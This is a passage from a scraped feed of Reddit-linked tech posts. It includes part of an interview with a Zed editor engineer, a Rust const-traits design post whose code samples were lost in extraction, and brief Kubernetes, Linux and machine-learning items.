UI frameworks out there. When I started out, I spent a lot of time working with jQuery and HTML in the DOM. How can we do better? So, I find it super interesting and challenging for me to build a UI framework with all the tools Rust gives us instead of all the tools that JavaScript and HTML give us.</p><p>I would say another really interesting aspect of this has been working on the terminal. It’s actually the first thing I built at Zed. I was hired as an intern at the time for a three-month summer project. I was like, \"All right, let me see what's in Zed. Oh, wow, there's not a lot here. Looks like you need a terminal.\" It was on their to-do list, so I just decided to take it on and get it shipped. I learned so many cursed facts about computers through that project. Did you know that there has been protocol compatibility from typewriters all the way to every modern IDE? There is this one character called the bell character which exists because there used to be a bell on the typewriter. When you sent the bell character, it rang the bell in the typewriter. Then there’s this whole evolution where Morse Code was turned into something the name of which I can’t remember (ed: telegraph codes) that turned into ASCII and then UTF-8. There's this 100+ years of history of communication protocols that are all backwards compatible with each other. That's so cool and weird. It's an interesting feeling being in the age of LLMs but also deep in the past where they rang a physical bell. That juxtaposition brings me a lot of joy.</p><p>Yeah, that's awesome. Usually I ask people where Rust fits in their stack, but I think with Zed that answer is pretty straightforward.</p><p>100%. Yeah, the whole thing!</p><p>So, why is Rust the right language for this task?</p><p>Rust makes projects like Zed viable. There are IDEs that were written long before Electron, and there will be many IDEs written afterward. But, a lot of them use a system-level programming language for one part and then write the rest in something else, because it turns out systems programming sucks real bad because of pointers and segmentation faults and so on. So, there's this pattern of, \"Okay, we've got this little core thing in the system language, now let’s bail. Let's get out of here, because, oh boy, if I have to deal with another segmentation fault, I'm going to die.\" With Rust, we don't have to do that. We do the full stack in Rust because it is actually reasonable to expect you can do that in a reasonable amount of time without your program crashing all the time. Rust has really solved some fundamental problems. Would I say Rust is the perfect language for this project? I would definitely say not. There’s no perfect. But, it’s great and getting better. There's this Rust ergonomics initiative that I'm extremely excited for. If we got easy clones and partial borrows, I think it would be a whole new language for us.</p><p>Rust has that unique ability to be applied to all the different layers of the stack reasonably.</p><p>Yeah, and we actually use this really heavily. For example, in our testing we have ordinary-ish Rust tests that spin up multiple clients, spin up a server, and have them talking over fake network channels. We do property testing by ordering some messages over these different things. It’s things like \"Oh, person A opens a buffer, person B jumps to a line while person A deletes that line,\" now check, \"Is everything what it should be?\" To accomplish that, we just use the same code we've been writing. We just call the internal APIs you would have called anyway. We don't need to do anything extra to have this sort of communication. They're just Rust structs. We just call methods on them. They're orchestrated by our framework, and there's a server that makes sure everything is happening, but that is a lot easier to write than if you’re spawning processes and passing messages because there’s a bunch of different languages involved.</p><p>So I’m told Zed is hiring?</p><p>Zed is hiring. We are.</p><p>What do you guys tend to look for in new hires?</p><p>We tend to look for three things. Obviously, you need to know your stuff. If you're able to think through problems and understand constraints, write good code, and test it well, those are kind of the fundamentals. One of the things that I see people have more trouble with is that Zed is a very social place. Engineers tend to be a little more introverted, so this could be a challenge for some. It's really important that we pair like I talked about before, because that's how information transfer is done. It's how Zed works. So, it’s really important that you’re a good communicator and a good person to work with.</p><p>The other thing that can be a challenge for some is that Zed is really set up for self-starters. We have very little process. We have very little hierarchy. There’s basically the founders and then everybody's just kind of in a big pool. People might have specific roles, but there's no managers really. There's none of that structure. This is great if you want to get a lot of cool things done, but it also means that you need to have a certain amount of a self-driven mentality. I think the ideal thing is if you come to Zed and you really want a particular feature and you can actually just get it done. If you can do that, you’re like a perfect candidate. If you're capable of understanding the code base to do that, that's amazing. Also, if you're able to talk to us and be like, \"Hey, I really want to add this. I think such and such way of doing it would work. What do you all think?\" Then we can have a dialogue and work through a solution. Nothing happens at Zed if you don't make it happen. We're also a growing company, so things are always changing.</p><p>My next question was about culture, and you kind of hit on some things there. You mentioned the social, self-starter type culture and the flat of flat hierarchy. You also mentioned the distributed nature. People are all over, and you're always trying to sync up schedules to pair program and stuff like that. Is there anything else unusual about the culture that you would want to call out?</p><p>Zed is very, very lively. There's a lot of discussion. Discussion is honestly the number one thing. There's a saying that says that you should have \"strong opinions, weakly held.\" Basically, you own your ideas and believe them, but when someone has a better idea you’re able to recognize it and change. For me, the way I approach this is I trust that there is ultimately a fast, good way of doing something, and everyone is collaborating in good faith to find it. I think that's a really killer part of the Zed culture. People stand their ground but also know when to move positions.</p><p>Okay, so here’s my last culture question. Is there anything unusual about compensation or benefits that would be interesting to point out?</p><p>Back in the day when the product wasn’t open to the public, I used to say that one of the benefits was that you got to use Zed. That was fun. Let’s see… There's unlimited time off. So, basically as long as the work gets done you can figure out what you need to do. One thing we've been doing for the last year is going to conferences together. It's always a really good time talking to our users and showing off Zed. We usually organize our company all-hands around Rust conferences so we're all in the same city. It's been kind of funny a couple times because we have so many people. We'll have like 15 people getting together at one booth at Rust conferences. We often kind of take over a little corner of the space because there's way more people than we need.</p><p>Here's another unique benefit. Zed is all about writing code. So, if you’re someone who doesn't want a lot of meetings, we got you! Also, we're an open source GPL project with VC funding. That’s a unique mix! Obviously we’re not the only startup in that situation, but it’s not common.</p><p>Actually, you know, you reminded me of something that I should have made a note to ask. Usually when a company is open source and in startup mode, one of the questions is what's the revenue model?</p><p>We get that question all the time. It's a little hard to answer because we haven't really tried to do it yet. But, there are three things we're looking at for revenue right now. One of those is token reselling. We can kind of be your one-stop shop to buy tokens for programming. That one might not be super sustainable based on various things happening out here. But, it's nice to have.</p><p>Another option is a closed source fork that has enterprise features, things like single sign-on, custom deployments, control over extensions, etc. There's a lot of things that we do not want to put in the regular product that an enterprise will need.</p><p>The third thing though is really the big vision, and that is collaboration. Long-term we really want to change how software is done. We really believe in CRDTs and getting these in at the foundation of your experience. For example, the edits going into a pairing session and the transcript of the session should all be context for LLMs. You should be able to take a slider and slide back and forth and watch the project be undone and redone. So, you can start to imagine a more CRDT-based version of GitHub. That is the long-term 10,000-foot vision. The reason we're a startup and not just a nice open source project is because that's a big vision. It's one that starts with having an amazing code editor. We think that once you have that code editor you're already at the right spot to take your normal files and turn them into CRDTs. Then you can do all this crazy stuff with them. There's a lot of this vision that isn't hashed out yet, but the long-term goal is CRDTs and cloud services based on those CRDTs along with live collaboration and other things you can do with keystroke-level granularity that you can't do with Git.</p><p>That was kind of the end of what I wanted to ask about, but I always like to ask if there's anything you wish we'd had the chance to discuss.</p><p>So, one thing I'd love for more people to know is that we have kind of two ways you can get hired. Obviously we have a normal hiring process. You can go look at our jobs. There's a bunch of jobs on our Zed jobs page. But, we've also had a lot of success hiring from open source as well. We'll have some really smart people come in and just start making PRs and adding features. We've made really good hires from open source contributors. So, maybe if you feel like your resume doesn't have what it needs on it, or if you're just uncomfortable with the uncertainty of throwing it out into the void, I would really encourage you to just get our attention by showing up and doing good work. I know Conrad and probably a few others also make a habit of publishing calendar links where you can just get some time to pair with us. So, there’s always a path into Zed that starts with just showing up, talking to us, and doing good work. I'm not asking for free work at all. I'm just saying this is an option that exists if it works better for your situation than the normal application review.</p><p>I love that you pointed that out. That is so cool for people that maybe don't feel like their resume is going to really communicate their potential. They can just submit a pull request.</p><p>Yes, submit a pull request and talk to us. Even more than sending a pull request, talk to us. Another thing I should mention is that part of this collaborative vision is this fun channel feature. Those are public, and we spend all day long jumping in public channels and working together. So, you can just ride along. We're an extremely open company. </p><p>Thanks so much for your time Mikayla!</p>","contentLength":29639,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1mvj8ai/talking_to_zed_industries_makers_of_the_100_rust/"},{"title":"[P] My open-source project on building production-level AI agents just hit 10K stars on GitHub","url":"https://www.reddit.com/r/MachineLearning/comments/1mvhpu6/p_my_opensource_project_on_building/","date":1755703150,"author":"/u/Nir777","guid":234630,"unread":true,"content":"<div><p>My Agents-Towards-Production GitHub repository just crossed 10,000 stars in only two months!</p><ul><li>33 detailed tutorials on building the components needed for production-level agents</li><li>Tutorials organized by category</li><li>Clear, high-quality explanations with diagrams and step-by-step code implementations</li><li>New tutorials are added regularly</li><li>I'll keep sharing updates about these tutorials here</li></ul><p>A huge thank you to all contributors who made this possible!</p></div>   submitted by   <a href=\"https://www.reddit.com/user/Nir777\"> /u/Nir777 </a>","contentLength":464,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Const Trait Counterexamples","url":"https://dbeef.dev/const-trait-counterexamples/","date":1755701221,"author":"/u/fee1-dead","guid":235699,"unread":true,"content":"<p>Hi. I'm the lead for Rust's const traits project group. We hope to stabilize const traits soon, but this is a complex feature with huge amounts of design considerations, and we keep getting the same comments from different people who probably have less familiarity with the feature and its design.</p><p>That's quite fair because I can't require everyone to have followed every discussion everywhere. I have followed loads of discussions, so this summarizes some of the counterarguments we've had so far.</p><p>If you're interested in the language design for how we plan to allow calling trait methods in const contexts, this should be a good complementary resource to the currently open <a href=\"https://github.com/rust-lang/rfcs/pull/3762\">RFC</a>. You might disagree with parts of this post, though.</p><p>Declare a trait as  so you can use it in trait bounds:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>Make impls  so we can satisfy those bounds:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>For generic const code, a  trait will be made available (not necessarily included in the first stabilization) to allow the type to be dropped at compile time:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p> is true for all , while  only holds if the compiler knows its destructor can be run in compile time. (See proposal 4 for more on this)</p><blockquote><p>We use  throughout this document but it is feasible to switch this to any other compatible syntax (like  or ). In fact, the nightly Rust as of writing accepts both  and . I'll stick to  for simplicity.</p></blockquote><p> is a modifier on trait bounds. (including super traits, e.g. <code>const trait A: ~const B {}</code>) In general, they only need to be proven if you're using them from const contexts. Hence they're also called \"maybe-const\" or \"const-if-const\" bounds.</p><p> bounds on a function are only enforced when you call it. This allows us to instantiate a function in const contexts even if we can't call it:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>But note that constness isn't a generic parameter and shouldn't be considered instantiated for each call to a : If you think about the function  and pass in a  that does not implement , the constness of  does  change due to the unsatisfied const predicate -  is \"always-const\" (and not ) in a sense that it simply imposes additional constraints if called in const contexts.\n</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>The call above errors not because  becomes non-const when  - it errors because <code>MyType&lt;u8&gt;: const PartialEq</code> isn't satisfied.</p><p>With the current proposal and model, we now explore a few alternatives that Rust team members have thought through, and I will explain why they can't really work.</p><p><em>Why not make  the default and use an opt-out for non-const bounds?</em></p><p>It is expected that people will write  bounds a lot. What if we made  implicitly const-when-const if it's inside a const item? i.e. making the following work:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>Users of non-const trait bounds in  will now use an opt-out syntax such as :</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>Why can't this work? The very first drawback this proposal faces is that these things are already possible on stable today:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>If we ever wanted to allow // to be callable in const contexts, then they should follow the same opt-out, necessitating the following change:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>This then runs into multiple problems.</p><h3>1A: editioning everything</h3><p>We already allow trait bounds that mean non-const in . This means if we were to change  in  to what we currently mean by , we have to do it over an edition since it is a breaking change.</p><p>But of course we can't make these changes immediately. Suppose we're currently in the 2024 edition and we accept this plan to migrate everyone to use  where necessary. We can accept  in any edition as it is equivalent to  now. Now in 2026 edition we deprecate non- bounds, we emit a warning everytime someone writes  but means . In 2028 edition  now means  (implicit behavior). We need to do this change over two editions because just doing it in one edition is even more problematic.</p><p>Suppose  becomes a const trait. This poses issues for crates in edition 2024 or below, who have written this:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>It is dangerous for crates having non-const bounds that never went through the intermediate 2026 edition to directly migrate to edition 2028, as edition migration processes primarily rely on things compilers can catch. There are things that  can't catch, and there are people who upgrade editions by simply bumping the number and fixing the issues that arise with bumping (how can you fault them? I personally never thought editions could significantly change behavior and meaning of syntax).</p><p>This is a major meaning change (perhaps bigger than <a href=\"https://doc.rust-lang.org/edition-guide/rust-2021/disjoint-capture-in-closures.html\">disjoint closure capture</a> and <a href=\"https://doc.rust-lang.org/edition-guide/rust-2024/temporary-if-let-scope.html\">if-let rescope</a> which won't break/change too much) because there are tons of  with trait bounds that all currently mean non-const. Their migration path to a potential 2028 edition is very scary to me.\n</p><h3>1B: non const traits and implicit bounds</h3><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>On the outset, there appears to be three choices:</p><ol><li>Compile this, with  conditionally const</li><li>Compile this, but  doesn't become conditionally const (not )</li><li>Make this a compile error.</li></ol><p>#1 can't really work due to breaking change complications when methods change their bounds to  (see 2A),\n#2 can't work either because it would make it a breaking change for someone to change their trait into a const trait (the  becomes stricter if  betrays its name and becomes )</p><p>So the only viable choice is #3. However, this has the ability to confuse many people, specifically with 1C and 1D.</p><p>Should  blocks also be a part of this elision? That is, should the following have a  bound applied to  but  bound applied to ?</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>If yes, this can be super confusing. 1B will turn this into an error on  if  is not a const trait. It's also a candidate for accidentally stricter bounds than necessary (when will users know when to use ? cc 1D)</p><p>If not, it can also be super confusing. The rules for when  implicitly means  would be complicated, hard to teach, and slightly inconsistent, given that something like the following  have implicit  at the impl-level.</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>All of this is mostly because of the weird double meaning of  (on non-const contexts, equivalent to  in const contexts, but  in )</p><p>An explicit opt-in scheme, with  bounds at the  level, if allowed, would not have the same issues, as it is clear what the user intended, and it is clear that it would apply to s.</p><p>Proposal 1 will make writing stricter bounds the default, as  in  is stricter than . It is only with non-const traits (1B) where a user will be prompted to use .</p><p>This is a broad assumption that users will most of the times want , similar to  vs. , but probably less correct than the latter. There are many constructors with trait bounds (e.g.  with ) that don't need to call methods at compile time. They can be\nintended for storage (so the stored types' methods can later be called at runtime), or just using traits' associated consts.</p><p>On the other hand,  as opt-in would be required only when someone attempts to call a trait's methods (easily suggestable by compiler errors), which would leave people more naturally using  to mean non-const if they don't need .</p><p>Remember the snippet at the beginning of this proposal which contained function pointers and dyn traits, and impl traits? Well.. about those.</p><p>Suppose in the future we might want to allow  or  pointers. Notwithstanding the potential complexity for the compiler to support these, but let's say <code>struct A(pub ~const fn())</code> is possible, and it means that the field must be a function pointer callable at compile time if  is being constructed at compile time.  operates similarly.</p><p>This then means an implicit  version now has to either (1) affect all types containing  pointers and s by making them imply  or (2) create an opt-in syntax specifically for these things.</p><p>(1) is self-evidently problematic; (2) feels extremely inconsistent, why use opt-in in some places but opt-out in others?</p><h2>proposal 2: selectiveness</h2><p><em>Why have const apply to the entire trait?</em></p><p>This has many layers to unwrap: why do we have to mark the trait at all? Can we have  choices? Can we do refinement with bounds on specific methods?</p><p>We'll answer these in this section, but we'll start with the most general fact: If we want s to be  or non-const, there must be a way to distinguish a trait that allows const implementations and a trait that does not. And all current traits (before const traits stabilize) must not allow const implementations.</p><h3>2A: Which Gender Is Your Trait</h3><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>For any generic parameter  where , we can't really call . Right now the bound on  is  but it should really be <code>S: ~const Sum&lt;Self::Item&gt;</code>. If we allowed calling , and the bound later turns , it would break if  remains having a non-const  impl. So to avoid breaking changes we have two choices:</p><ol><li>Allow  on non-const traits but can't call any of the methods</li><li>Disallow  on non-const traits.</li></ol><p>Our current design uses #2, as #1 feels quite counterintuitive: the idea of  bounds is to allow calling methods on them, so it isn't really useful. It would also prevent any actual uses of generic items with  bounds on non-const traits, as s cannot be written without the trait being . With #2, we're able to give trait authors  chance to make sure their bounds are either non-const or  as they see fit. As once the trait is , turning existing non-const bounds into  would be a breaking chnage.</p><p>In any case, the compiler must know what is a  and what is not.</p><p>The alternative here would be to allow  bounds on  without it being marked a const trait, but not allow calls to methods until the methods are marked const in some way. (i.e. per-method constness)</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>This has its own caveats.</p><p>First, this means there are never-const methods in a trait. Some methods allow callers in const contexts and require const implementations while some do not. I don't think that's really useful. If a user writes , they'd normally expect every method in  to now be const-callable. It's quite rare for a trait to be designed in a way that allows some methods to be callable in const contexts while others not. (at least, no one has ever provided a concrete example) Those use cases would be covered by separating them into two traits anyways.</p><p>Second, we  need a way to figure out whether a trait is  to decide whether to allow s. We can't allow s for non-const traits, to allow existing non-const traits to transition their methods into const.</p><p>But that means once  makes  and publishes a new crate version, they've lost their ability to make  in the future, as downstream crates would happily do this:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>That is super awkward to both teach and learn. This awkwardness was even more extensively discussed in my <a href=\"https://hackmd.io/@beef/rJ1We7aCkl\">HackMD doc</a> from four months ago.</p><p>Okay, so, it's really awkward for fine-grained per-method constness to co-exist with whole-trait constness (necessary for trait bounds as well as whether to allow s). What if we dealt away with whole-trait constness entirely?</p><p>Consider  bounds on methods. Some scheme like:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>Where s can't be wholly  or non-const, but individual methods can become  on their own:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>But that proposal has a  of downsides.</p><p>Because all methods' signatures are now lying to you. Consider the common case of some impl using a generic type's methods:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>in <code>Option&lt;T&gt;::some_fun_method</code>, we have no idea whether we can actually call , without writing a bound. Making this bound apply to the entire trait impl seems awful to require (defeats the entire point of an individual method being  and writing  bounds on individual methods), so then this per-method bound now applies to . That also means the requirements for a particular method to be  may be stricter than what is written on the trait method signature. ( has no additional restrictions whereas <code>&lt;Option&lt;T&gt; as C&gt;::some_fun_method</code> does).</p><p>This is pretty much not avoidable, as traits upstream cannot know what methods downstream impls want to call (in this case,  is not even nameable at the upstream trait )</p><p>Therefore, all const fns that attempt to call some trait methods on a generic parameter must add a bound on that specific method.</p><p>This is particularly frustrating for , which has loads of extension methods (that can all be overriden to do something non-const, under this scheme), and bounds are necessary for all methods being called, resulting in the following for a function that should have been super simple:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>This proposal might also need special annotations on trait methods that provide a  default method body but otherwise doesn't require downstream s to be  (otherwise you wouldn't know which default method bodies are callable from ). That adds an additional layer of syntax complexity which needs to be designed.</p><p>There was also a bit of Zulip discussion on this. See <a href=\"https://rust-lang.zulipchat.com/#narrow/channel/328082-t-lang.2Feffects/topic/Is.20const.20a.20trait.20modifier.20at.20all.3F\">this topic</a> and its discussion, mainly before May 8th.</p><h2>proposal 3: isn't it just ?</h2><p><em>Why not use  for const-when-const bounds?</em></p><p>This is one of the proposals which actually has  merit. The idea is to use  for the \"const-if-const\" syntax, while thinking about the future with  or  to represent always-const bounds.</p><p>Because it turns out we actually do need always-const bounds, for the trait bound to be used in an assoc const-item , in a const block , or in const generic arguments . Those could become usage sites that require a stricter bound than , so we must think about reserving the \"always-const\" bound for them.</p><p>My main reservation with this proposal is that it sort of justifies a change of const items, const blocks into using the same new syntax for always-const bounds. so <code>const(always) X: i32 = 42;</code> and <code>const(always) { 2 * 3 * 7 }</code> instead of what we have now which reserves  for always-const to keep the consistency. But we always have  form of (small, potentially acceptable) inconsistency one way or the other (such as  in , see proposal 6), so it might end up being an option we end up choosing.</p><h2>proposal 4: destructive interference</h2><p><em>Why ? Why not just ?</em></p><p>We are in a special place because some destructors are non-const. We already allow s, so there needs to be a way to distinguish types that can be dropped in compile time from types that cannot.</p><p>This leads to us to a new marker trait called , which is automatically implemented. Non-const  holds for all types, but  only holds if the type's  impl (if it exists) is const and the type's components all implement .</p><p>Therefore, you must sprinkle your functions with  bounds when you're constifying them, if generic parameters need to be dropped at any point in the function.</p><p>Why not ? Well it makes a huge asymmetry with  bounds, as the latter would only hold if  has a manual  impl. It would also make  not imply , which has weird language-level implications as well as compiler-level implications. (we have run into trait bound cache issues with this in the past)\n</p><p> is also a valid bound even though you might not have seen this. <a href=\"https://github.com/taiki-e/pin-project/blob/b8e1b1640fa0edd0b27da9e084bec827eb927f2d/pin-project-internal/src/lib.rs#L107-L132\">uses</a> this bound to prevent any user from writing their own custom destructors on their types. So no matter what scheme we end up choosing, we  have at least two traits. One to represent the ability to be destructed, one to represent whether or not a type has a custom destructor. Otherwise we run into asymmetry between  vs .</p><h2>proposal 4.5: destructive interference, part 2</h2><p><em>Can we make  implicit?</em></p><p>This is hard to say, depending on what is meant by \"implicit\". Inferring whether requiring  for generic types based on whether the code has a possibility to drop the type is no-go, because changing the type signature/trait bounds based on the body has loads of bad semver complications and is generally not possible in the compiler architecture.</p><p>Making  implicit for all generic params is not good, either. Many generic API interfaces want to assume as little about their types as possible, so a broad scheme like this necessitates an opt-out syntax which seems too odd to have/hard to design.</p><p>A more limited plan might be to infer a  super trait if some methods on a trait take  by-value, that also has issues because the following example means shouldn't have <code>const trait Add: ~const Destruct</code> inferred:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>One possible plan (will likely be our actual plan) is to lint const traits that take  by-value and recommend adding a  super trait. That way it will save crate users relying on that trait to not have to add  bounds everywhere, at the same time not assuming everyone wants this.</p><h2>proposal 5: academic zealotry</h2><p><em>Let's follow the approach used in academic paper X..</em></p><p>Academic research is exciting work. Language design in Rust is different (maybe slightly boring?) because it's mostly a weighing of the pros and cons of every possible alternatives and finding ways to practically make the language more capable.</p><p>The work on const traits in Rust is often linked to work on effects in other (academic) programming languages, results published via research papers, etc.</p><p>We then often see an excitement to apply those academic thinking models to Rust.</p><p>Those thinking models often appear super convoluted to me. It sometimes looks like practicality has been dismissed in favor of generality. That's fine, but I don't think they are very compatible with Rust.</p><p>I think it would be fair to consider the role of formal modeling of effects as a different programming language and how programmers using that programming language model their functions and their ability to be called in different contexts. (i.e. runtime vs. compile time)</p><p>The academic way of thinking about effects/const traits holds the same amount of weight as some other programming language's way of thinking about effects/const traits to me. It's nice to try to incorporate the bits that would work for us, but incompatible things are incompatible. Forcing Rust's model to be losslessly transferable to a formal model is equivalent to forcing Rust's model to be losslessly transferable to a different programming language, say Zig. We can't assume that ideas about programming languages suddenly become applicable to all programming languages just because those ideas are published to a peer-reviewed journal. Our RFCs are always peer-reviewed, too.</p><p>It is cool to think about effects or capabilities and how we can encode them as modifiers to entities in the type system, be it traits, trait bounds, functions, impls, etc. We're not in the best place to unify them because  is the inverse of an effect (it prevents you from calling non-const items) while  is an actual effect (it allows you to call other  items). At the same time  seems like it wants to apply to the whole trait, while partial maybe- traits seem very desirable.</p><p>If we wanted to unify them to make our version of effects closer to formal modeling, we must do so for everything that we currently have, not just const traits. So we should also think about whether it is really  to do so in the first place, and then decide whether or not we can proceed with a stabilization of const traits with the pieces that make the most sense for the language , without having to make our effects story consistent first.</p><h2>proposal 6: drowning in conditionals</h2><p><em>We should have  and  and , etc.</em></p><p>The idea here is that  is \"conditionally const\", i.e. may or may not require const impls depending on whether called from a const context. Given that  is also \"maybe-const\" (i.e. could be called from both non-const and const contexts), we should make them also use , like  for consistency and also distinguish with  items.</p><p>My biggest feeling here is that it changes up everything for no gain. I think rarely anyone benefits from this. It might feel consistent but I'd rather not let us be consistent for consistent's sake.</p><p>But still, there are other consistency arguments that contradict this. , , and , and const items/const blocks all restrict their bodies to operations performable in compile time, i.e. they must all call s. In terms of restriction they work mostly the same except for which trait's methods they can call (in  you can call methods from  but in  items you can't)</p><p>Also, it makes little sense to have an \"always-const\" fn such that it cannot be called in  fns. But that's what  seems to imply exists.</p><p>The other idea here relates to the \"meaning of \" section. The constness of the  never changes. It should always be evaluatable at compile time. But when you pass in some  into <code>const fn foo&lt;T: ~const Tr&gt;</code> that doesn't , and try to call it from compile time, it's not that  now is non-const ( is fully prepared to be evaluated in compile time) but that you aren't satisfying 's constraints.</p><h2>proposal 7: questionable conditions</h2><p><em> is okay for \"maybe-const\".. right?</em></p><p>We have received proposals like this because  introduces a new sigil, and the alternatives don't seem to be as good. Why don't we use  to mean ?</p><p>The main reason here is that  has an existing meaning in trait-bound adjacent areas, which is to  a bound, or to  a default, such as .  is a stricter bound than , so using  for it isn't really nice. This is also the reason proposal 1 (and the ancient implementation before it got switched due to issues aforementioned) uses  for opt-out.</p><p>Using  for opt-in, on the other hand, isn't a good syntax proposal.</p><h2>let's try picking wavelengths for these sheds..</h2><p>These are things we should actually try to form consensus on before stabilizing:</p><ul><li>Syntax of the const-when-const bounds. There's  and  and <ul><li>We can figure this out along with possibility of proposal 3 ( =&gt; ,  =&gt;  or other) on the table.</li></ul></li><li>Order of keywords - whether to use  or </li><li>Naming of <ul><li>Not really discussed anywhere, but we might want to find a better name for  if we want to stabilize it. ? ?</li></ul></li></ul><p>These are some features that are  essential for const traits. Including them will unnecessarily enlarge the scope\nof the RFC. But it might still be useful to propose them later.</p><ul><li> trait methods - where downstream has to implement as  no matter whether  is const or not.</li><li> pointers, , </li><li>Figuring out something for the \"really const\" distinction (related to proposal 6), if that is really worth it - what\nwe should do with  blocks and  items.</li><li>Figuring out a way to configure derives (built-in or custom) to generate const implementations.\n<ul><li>Although we might still want to recommend a way for custom derives to start generating const impls.</li></ul></li></ul><p>I started my work on const traits on <a href=\"https://github.com/rust-lang/rust/pull/86750\">July 1st, 2021</a>, making it so that\nconst trait impls can be called across different crates. I've worked on the implementation of this feature since then,\nand now it's been four years.</p><p>We might still have many years to go, but hopefully this post helps making the language design discourse better.</p><p>If you would like to get involved, feel free to go comment on the <a href=\"https://github.com/rust-lang/rfcs/pull/3762\">open RFC</a> (please comment on specific lines or on\nthe file using the PR review feature, this makes discussion threaded and much easier to follow), or follow discussions\noccuring on the <a href=\"https://rust-lang.zulipchat.com/#narrow/channel/328082-t-lang.2Feffects\">#t-lang/effects</a> Zulip channel.</p><ul><li>Thanks <a href=\"https://github.com/compiler-errors\">errs</a> for the encouragement to write this post, and <a href=\"https://github.com/oli-obk\">oli</a> for commenting on initial drafts of the proposal and providing more thinking on Proposal 4 and 4.5.</li></ul>","contentLength":22408,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1mvgukq/const_trait_counterexamples/"},{"title":"Linux 6.18 To Introduce New Driver For TASCAM US-144MKII USB Audio Interface","url":"https://www.phoronix.com/news/Linux-Driver-TASCAM-US-144MKII","date":1755700992,"author":"/u/Cristiano1","guid":234663,"unread":true,"content":"<p>Michael Larabel is the principal author of Phoronix.com and founded the site in 2004 with a focus on enriching the Linux hardware experience. Michael has written more than 20,000 articles covering the state of Linux hardware support, Linux performance, graphics drivers, and other topics. Michael is also the lead developer of the Phoronix Test Suite, Phoromatic, and OpenBenchmarking.org automated benchmarking software. He can be followed via <a href=\"https://twitter.com/MichaelLarabel\">Twitter</a>, <a href=\"https://www.linkedin.com/in/michaellarabel/\">LinkedIn</a>, or contacted via <a href=\"https://www.michaellarabel.com/\">MichaelLarabel.com</a>.</p>","contentLength":500,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1mvgqui/linux_618_to_introduce_new_driver_for_tascam/"},{"title":"K8s Sneak Peak v1.34","url":"https://www.reddit.com/r/kubernetes/comments/1mvgjo8/k8s_sneak_peak_v134/","date":1755700543,"author":"/u/tania019333","guid":234701,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/tania019333\"> /u/tania019333 </a>","contentLength":34,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"OPA is now maintained by Apple","url":"https://blog.openpolicyagent.org/note-from-teemu-tim-and-torin-to-the-open-policy-agent-community-2dbbfe494371","date":1755699943,"author":"/u/ExtensionSuccess8539","guid":234581,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1mvgabr/opa_is_now_maintained_by_apple/"},{"title":"Why Kubernetes?","url":"https://www.reddit.com/r/kubernetes/comments/1mvflfs/why_kubernetes/","date":1755698384,"author":"/u/rickreynoldssf","guid":234582,"unread":true,"content":"<p>I'm not trolling here, this is an honest observation/question...</p><p>I come from a company that built a home-grown orchestration system, similar to Kubernetes but 90% point and click. There we could let servers run for literally months without even thinking about them. There were no DevOps, the engineers took care of things as needed. We did many daily deployments and rarely had downtime.</p><p>Now I'm at a company using K8S doing fewer daily deployments and we need a full time DevOps team to keep it running. There's almost always a pod that needs to get restarted, a node that needs a reboot, some DaemonSet that is stuck, etc. etc. And the networking is so fragile. We need multus and keeping that running is a headache and doing that in a multi node cluster is almost impossible without layers of over complexity. ..and when it breaks the whole node is toast and needs a rebuild.</p><p>So why is Kubernetes so great? I long for the days of the old system I basically forgot about.</p><p>Maybe we're having these problems because we're on Azure and noticed our nodes get bounced around to different hypervisors relatively often, or just that Azure is bad at K8S?</p>","contentLength":1144,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[P] GridSearchCV always overfits? I built a fix","url":"https://www.reddit.com/r/MachineLearning/comments/1mvfktv/p_gridsearchcv_always_overfits_i_built_a_fix/","date":1755698341,"author":"/u/AdhesivenessOk3187","guid":234548,"unread":true,"content":"<p>So I kept running into this:  picks the model with the best validation score… but that model is often overfitting (train super high, test a bit inflated).</p><p>I wrote a tiny selector that balances:</p><ul><li>how good the test score is</li><li>how close train and test are (gap)</li></ul><p>Basically, it tries to pick the “stable” model, not just the flashy one.</p>","contentLength":330,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Rust: Python’s new performance engine","url":"https://thenewstack.io/rust-pythons-new-performance-engine/","date":1755698163,"author":"/u/dochtman","guid":234628,"unread":true,"content":"<p><a href=\"https://thenewstack.io/what-is-python/\">Python</a> developers have always faced a trade-off: write elegant, readable code or go for high performance. For a long time, this meant reaching for <a href=\"https://thenewstack.io/code-wars-rust-vs-c-in-the-battle-for-billion-device-safety/\">C</a> extensions when speed mattered. But <a 